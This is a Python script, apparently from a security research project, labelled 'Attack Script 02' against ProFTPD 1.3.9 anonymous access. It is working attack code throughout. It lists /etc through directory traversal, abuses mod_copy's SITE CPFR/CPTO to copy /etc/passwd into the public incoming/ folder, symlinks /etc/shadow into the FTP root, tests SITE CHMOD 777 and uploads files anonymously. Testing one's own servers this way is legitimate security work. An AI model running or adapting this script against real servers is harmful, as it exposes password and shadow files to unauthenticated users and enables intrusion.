#!/usr/bin/env python3
"""
ProFTPD 1.3.9 — Attack Script 02: Anonymous Access Abuse
independent security research. — Phase 3

Tests scope of anonymous FTP access:
1. Anonymous login and directory traversal
2. Anonymous LIST of sensitive directories
3. Anonymous file upload to incoming/
4. Anonymous mod_copy abuse
5. Anonymous SITE commands
"""
import socket, time, json, os, re
from datetime import datetime

HOST, PORT = "127.0.0.1", 21
EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/ProFTPD/evidence"

def drain_recv(s, timeout=3):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(8192)
            if not chunk: break
            data += chunk
            decoded = data.decode('utf-8', errors='replace')
            lines = [l for l in decoded.strip().split('\n') if l.strip()]
            if lines:
                last = lines[-1]
                if len(last) >= 4 and last[:3].isdigit() and last[3] == ' ':
                    break
    except socket.timeout:
        pass
    return data.decode('utf-8', errors='replace').strip()

def connect_anon():
    s = socket.socket(); s.settimeout(10); s.connect((HOST, PORT))
    drain_recv(s)
    s.sendall(b"USER anonymous\r\n"); r1 = drain_recv(s)
    s.sendall(b"PASS test@test.com\r\n"); r2 = drain_recv(s)
    logged_in = "230" in r2
    return s, logged_in

def cmd(s, c):
    s.sendall((c+"\r\n").encode())
    return drain_recv(s)

def list_dir(s, path):
    """LIST with real PASV connection."""
    pasv = cmd(s, "PASV")
    m = re.search(r'\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)', pasv)
    if not m: return ""
    h = '.'.join(m.group(i) for i in range(1,5))
    p = int(m.group(5))*256+int(m.group(6))
    ds = socket.socket(); ds.settimeout(8); ds.connect((h, p))
    s.sendall(f"LIST {path}\r\n".encode())
    try: s.settimeout(3); s.recv(256)
    except: pass
    data = b""
    try:
        while True:
            c = ds.recv(4096)
            if not c: break
            data += c
    except: pass
    ds.close()
    return data.decode('utf-8','replace')

def main():
    print("="*60)
    print("Attack 02: Anonymous Access Abuse")
    print("ProFTPD 1.3.9 — Phase 3 Targeted Attacks")
    print("="*60)

    evidence = {
        "attack": "anonymous_access_abuse",
        "date": datetime.now().isoformat(),
        "tests": {}
    }

    # TEST 1: Verify anonymous login
    print("\n[1] Anonymous login test")
    s, ok = connect_anon()
    evidence["tests"]["anon_login"] = {"success": ok}
    print(f"  Anonymous login: {'SUCCESS' if ok else 'FAILED'}")
    if not ok:
        print("  [!] Anonymous login disabled — remaining tests skipped")
        s.close()
        with open(f"{EVIDENCE_DIR}/attack_02_anon_abuse.json",'w') as f:
            json.dump(evidence, f, indent=2)
        return

    # TEST 2: Directory listing
    print("\n[2] Anonymous directory traversal")
    traversal_tests = [
        ("/srv/ftp", "FTP root"),
        ("/", "Filesystem root"),
        ("/etc", "/etc directory"),
        ("/home", "/home directory"),
        ("/tmp", "/tmp directory"),
        ("../", "Parent of FTP root"),
        ("../../", "Two levels up"),
        ("../../../etc", "/etc via traversal"),
    ]
    listing_results = {}
    for path, label in traversal_tests:
        s2, ok2 = connect_anon()
        if ok2:
            listing = list_dir(s2, path)
            lines = [l for l in listing.strip().split('\n') if l.strip()]
            listing_results[path] = {
                "label": label, "entries": len(lines),
                "sample": lines[:5]
            }
            print(f"  {'[+]' if lines else '[-]'} {label} ({path}): {len(lines)} entries")
            for l in lines[:3]: print(f"      {l}")
        s2.close()
        time.sleep(0.1)
    evidence["tests"]["directory_traversal"] = listing_results

    # TEST 3: Anonymous mod_copy (SITE CPFR/CPTO)
    print("\n[3] Anonymous SITE CPFR/CPTO")
    s3, ok3 = connect_anon()
    cpfr_resp = ""
    cpto_resp = ""
    if ok3:
        cpfr_resp = cmd(s3, "SITE CPFR /etc/passwd")
        if "350" in cpfr_resp:
            cpto_resp = cmd(s3, "SITE CPTO /srv/ftp/incoming/passwd_copy")
        print(f"  CPFR: {cpfr_resp[:80]}")
        print(f"  CPTO: {cpto_resp[:80]}")
    s3.close()
    evidence["tests"]["anon_modcopy"] = {
        "cpfr_response": cpfr_resp, "cpto_response": cpto_resp,
        "success": "250" in cpto_resp
    }

    # TEST 4: Anonymous SITE SYMLINK
    print("\n[4] Anonymous SITE SYMLINK")
    s4, ok4 = connect_anon()
    sym_resp = ""
    if ok4:
        sym_resp = cmd(s4, "SITE SYMLINK /etc/shadow /srv/ftp/shadow_link")
        print(f"  SYMLINK: {sym_resp[:80]}")
    s4.close()
    evidence["tests"]["anon_symlink"] = {
        "response": sym_resp,
        "success": "200" in sym_resp
    }

    # TEST 5: Anonymous upload to incoming
    print("\n[5] Anonymous upload to /srv/ftp/incoming/")
    s5, ok5 = connect_anon()
    upload_ok = False
    upload_resp = ""
    if ok5:
        pasv = cmd(s5, "PASV")
        m = re.search(r'\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)', pasv)
        if m:
            h = '.'.join(m.group(i) for i in range(1,5))
            p = int(m.group(5))*256+int(m.group(6))
            ds = socket.socket(); ds.settimeout(5); ds.connect((h, p))
            s5.sendall(b"STOR incoming/anon_upload_test.txt\r\n")
            time.sleep(0.3)
            try: s5.recv(256)
            except: pass
            ds.sendall(b"Anonymous upload test payload\n")
            ds.close()
            time.sleep(0.2)
            try: upload_resp = s5.recv(1024).decode('utf-8','replace')
            except: pass
            upload_ok = "226" in upload_resp or "250" in upload_resp
        print(f"  Upload to incoming/: {'SUCCESS' if upload_ok else 'FAILED'}: {upload_resp[:80]}")
    s5.close()
    evidence["tests"]["anon_upload"] = {
        "success": upload_ok, "response": upload_resp
    }

    # TEST 6: Commands allowed pre/post anonymous login
    print("\n[6] Anonymous command scope")
    s6, ok6 = connect_anon()
    if ok6:
        anon_cmds = [
            ("PWD", "PWD"),
            ("SYST", "SYST"),
            ("SITE HELP", "SITE HELP"),
            ("SITE CHMOD 777 /srv/ftp", "SITE CHMOD /srv/ftp"),
            ("SITE MKDIR /srv/ftp/newdir", "SITE MKDIR"),
            ("SIZE /etc/passwd", "SIZE /etc/passwd"),
            ("MDTM /etc/passwd", "MDTM /etc/passwd"),
            ("STAT /etc", "STAT /etc"),
        ]
        cmd_results = {}
        for c, label in anon_cmds:
            resp = cmd(s6, c)
            code = resp[:3] if resp else "???"
            cmd_results[c] = {"code": code, "response": resp[:100]}
            print(f"  {code} {label}")
    s6.close()
    evidence["tests"]["anon_command_scope"] = cmd_results

    outfile = f"{EVIDENCE_DIR}/attack_02_anon_abuse.json"
    with open(outfile, 'w') as f:
        json.dump(evidence, f, indent=2)
    print(f"\n[*] Evidence saved to {outfile}")

if __name__ == "__main__":
    main()
